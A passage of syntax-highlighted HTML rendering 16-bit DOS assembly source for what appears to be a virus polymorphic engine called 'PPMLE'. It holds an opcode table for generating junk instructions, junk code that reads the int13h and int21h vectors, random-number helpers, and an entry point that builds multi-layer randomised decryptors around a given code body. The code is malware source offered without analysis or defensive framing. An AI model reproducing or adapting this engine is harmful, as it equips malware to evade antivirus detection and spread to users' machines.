        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">72h</span><span class="sc0"> </span><span class="sc1">; jb</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">76h</span><span class="sc0"> </span><span class="sc1">; jbe</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E3h</span><span class="sc0"> </span><span class="sc1">; jcxz</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">74h</span><span class="sc0"> </span><span class="sc1">; je</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">7Fh</span><span class="sc0"> </span><span class="sc1">; jg</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">7Dh</span><span class="sc0"> </span><span class="sc1">; jnl</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">7Ch</span><span class="sc0"> </span><span class="sc1">; jl</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">7Eh</span><span class="sc0"> </span><span class="sc1">; jle</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EBh</span><span class="sc0"> </span><span class="sc1">; jmp</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">75h</span><span class="sc0"> </span><span class="sc1">; jne</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">71h</span><span class="sc0"> </span><span class="sc1">; jno</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">7Bh</span><span class="sc0"> </span><span class="sc1">; jnp</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">79h</span><span class="sc0"> </span><span class="sc1">; jns</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">70h</span><span class="sc0"> </span><span class="sc1">; jo</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">7Ah</span><span class="sc0"> </span><span class="sc1">; jp</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">78h</span><span class="sc0"> </span><span class="sc1">; js</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D7h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4Ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get int13h vector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0d7h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">84h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get int21h vector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0a7h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">grb_const_loop_5</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">grb_const_loop_5</span><span class="sc0">


        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b7h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">grb_const_loop_4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">grb_const_loop_4</span><span class="sc0">


        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">88h</span><span class="sc0"> </span><span class="sc1">; mov reg,reg or from mem</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc0"> </span><span class="sc1">; mov reg,imm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">63h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0"> </span><span class="sc1">; neg register</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">; used for register</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F5h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">63h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0"> </span><span class="sc1">; not register</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">; used for register</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">60h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">; or reg,reg or from mem</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">61h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Ch</span><span class="sc0"> </span><span class="sc1">; or reg,imm (ax/al only)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">62h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; or reg,imm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">27h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">27h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">27h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">27h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">27h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">27h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">17h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A7h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">grb_const_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">grb_const_loop</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">67h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">grb_const_loop_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">grb_const_loop_2</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">97h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">grb_const_loop_3</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">grb_const_nijmp</span><span class="sc0">
</span><span class="sc5">grb_const_nijmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">grb_const_loop_3</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">67h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">47h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">27h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">47h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">grb_const_nicall</span><span class="sc0">
</span><span class="sc5">grb_const_nicall</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">; rcl register</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">; used for register</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">; rcr register</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">; used for register</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">63h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">; rol register</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; used for register</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">63h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">; ror register</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">; used for register</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">63h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">; shl register</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">; used for register</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">; sar register</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">38h</span><span class="sc0"> </span><span class="sc1">; used for register</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">63h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0"> </span><span class="sc1">; shr register</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">28h</span><span class="sc0"> </span><span class="sc1">; used for register</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">95h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">17h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">15h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">60h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">28h</span><span class="sc0"> </span><span class="sc1">; sub reg,reg or from mem</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">61h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Ch</span><span class="sc0"> </span><span class="sc1">; sub reg,imm (ax/al only)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">62h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; sub reg,imm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">28h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A8h</span><span class="sc0"> </span><span class="sc1">; test reg,imm (ax/al only)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0"> </span><span class="sc1">; test reg,imm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">60h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">30h</span><span class="sc0"> </span><span class="sc1">; xor reg,reg or from mem</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">61h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">34h</span><span class="sc0"> </span><span class="sc1">; xor reg,imm (ax/al only)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">32h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; xor reg,imm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">30h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">; marker for end of table</span><span class="sc0">
</span><span class="sc5">i_table_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">rnd_init_seed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rda_get_datetime</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_random_limit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_value_with_modulus</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_random_0_or_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; PPMLE entry point</span><span class="sc0">
</span><span class="sc1">;  calling registers:</span><span class="sc0">
</span><span class="sc1">;   CX = lenght to encrypt</span><span class="sc0">
</span><span class="sc1">;   SI = running offset</span><span class="sc0">
</span><span class="sc1">;   DI = where to put generated code</span><span class="sc0">
</span><span class="sc1">;   BX =</span><span class="sc0">

</span><span class="sc5">ppmle_gen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">; how many encryption layers</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">    </span><span class="sc1">; (RDA layer not included)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_layer_nr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_actual_layer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_reg_cx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">    </span><span class="sc1">; store some regs and then</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_reg_si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">    </span><span class="sc1">; call the poly routine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_reg_bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_reg_di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_poly</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_reg_di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_total_lenght</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; back from poly</span><span class="sc0">

</span><span class="sc1">;  return registers:</span><span class="sc0">
</span><span class="sc1">;   CX = lenght of generated code</span><span class="sc0">
</span><span class="sc1">;   DX = pointer on generated code</span><span class="sc0">


</span><span class="sc5">generate_poly</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_actual_layer</span><span class="sc4">]</span><span class="sc0">
